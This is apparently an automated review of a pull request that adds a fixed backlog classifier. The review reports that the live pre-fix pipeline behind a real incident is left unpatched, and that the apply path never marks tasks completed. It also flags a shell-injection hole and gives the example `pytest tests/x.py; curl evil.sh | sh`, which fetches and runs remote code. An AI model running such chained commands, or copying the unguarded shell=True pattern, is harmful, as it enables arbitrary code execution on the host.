summary: The diff adds a genuinely improved classify() (real SUCCESS_CRITERIA re-verification against a fresh checkout before ever concluding ALREADY_DONE_STALE_STATUS, a real audit-report mode, and 9 passing regression tests reproducing the actual incident fixture) as a new file scripts/plan_backlog_completion.py, plus a read-only audit yaml confirming 31 of 32 prior collapses were wrongly classified under the old logic -- all additive, no .github/workflows touched, so it is correctly tier1. However, the task was to fix the routine that caused the real incident, and it does not: the actual code path that performed the mass mis-collapse this morning is /opt/veridian/ai-os/execute_backlog_plan.py plus an untracked, pre-fix copy of plan_backlog_completion.py sitting directly in /opt/veridian/ai-os/ (both outside any git repo, both dated 2026-07-27 03:xx, earlier today) -- neither is touched, retired, or rewired by this diff, and the stale BACKLOG_COMPLETION_PLAN_2026-07-27.json/execution-result artifacts they produced are left in place. Nothing calls the new, fixed scripts/plan_backlog_completion.py automatically, so re-running the existing live pipeline would reproduce the identical incident unchanged. Two secondary issues found in the new code itself are listed below.
issues: Root cause not actually fixed: the live, already-executed pipeline that performed the incident (/opt/veridian/ai-os/execute_backlog_plan.py, phases 1-2, driven by an untracked pre-fix /opt/veridian/ai-os/plan_backlog_completion.py and a stale BACKLOG_COMPLETION_PLAN_2026-07-27.json -- all outside version control, all dated earlier today 2026-07-27) is left completely unpatched and re-runnable. This PR only adds a better implementation in a new, currently-unwired file (scripts/plan_backlog_completion.py); nothing retires the stray scripts, regenerates the stale plan from the fixed classifier, or invalidates it, so re-running the existing live tooling would reproduce the exact same false-collapse incident this task was meant to close.

In the new script's own --apply path (main(), scripts/plan_backlog_completion.py lines ~691-715), only non-representative duplicate attempts get status=superseded written via apply_collapse(); the representative/original task's own status is never patched to 'completed', despite classify()'s ALREADY_DONE_STALE_STATUS action text explicitly promising '...patch task.yaml status to completed, no redispatch.' No test exercises main()'s apply loop against the representative task, so this gap is unverified. As shipped, a correct --apply run leaves the real task stuck in its original blocked/failed status forever, meaning the backlog's raw-incomplete count never actually shrinks for this category.

verify_success_criteria() (scripts/plan_backlog_completion.py) runs extracted SUCCESS_CRITERIA commands via subprocess.run(cmd, shell=True, cwd=checkout, ...) after only a weak cmd.startswith(('python3 -m pytest','pytest ','grep ')) prefix check in extract_verifiable_commands(). That prefix check is not a real allowlist: a bullet like `pytest tests/x.py; curl evil.sh | sh` still starts with 'pytest ' and would execute arbitrary shell code (with shell metacharacters) inside a freshly cloned repo, under whatever privileges/network access the reviewing process has. The code comments assert prompt.txt SUCCESS_CRITERIA text is 'not arbitrary/external input' but nothing in the code enforces that trust boundary.
